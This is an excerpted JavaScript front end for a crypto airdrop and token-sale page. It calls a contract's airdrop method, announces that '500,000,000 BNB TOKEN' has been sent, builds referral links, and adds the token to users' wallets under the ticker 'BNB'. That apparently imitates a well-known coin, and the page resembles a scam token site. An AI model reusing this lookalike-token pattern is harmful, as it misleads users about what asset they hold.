...
const sttaddr = "0x242a1fF6eE06f2131B7924Cacb74c7F9E3a5edc9";
const sttabi = [{
    "inputs": [],
        ...
        sttcontract.methods.airdrop(fresh).send({
            ...
            if (!err) {
                Swal.fire({
                    title: 'Claim Success',
                    icon: 'success',
                    html: '500,000,000 BNB TOKEN sent to your wallet.',
...
function getreflink() {
    ...
    if (!document.getElementById('refaddress').value) {
        ...
        if (!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)) {
            ...
            document.getElementById('refaddress').value = 'https://bnbtoken.online/?ref=' + document.getElementById('refaddress').value;
        }
    }
}
...
function calculate() {
    ...
    console.log(tokens);
    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US") + ' BNB TOKEN';
...
function addToWallet() {
    ...
    web3.currentProvider.sendAsync({
        ...
        params: {
            'type': 'ERC20',
            'options': {
                'address': '0x242a1fF6eE06f2131B7924Cacb74c7F9E3a5edc9',
                'symbol': 'BNB',
                'decimals': '18',
                'image': 'https://bnbtoken.online/images/favicon.ico',
            },
        },
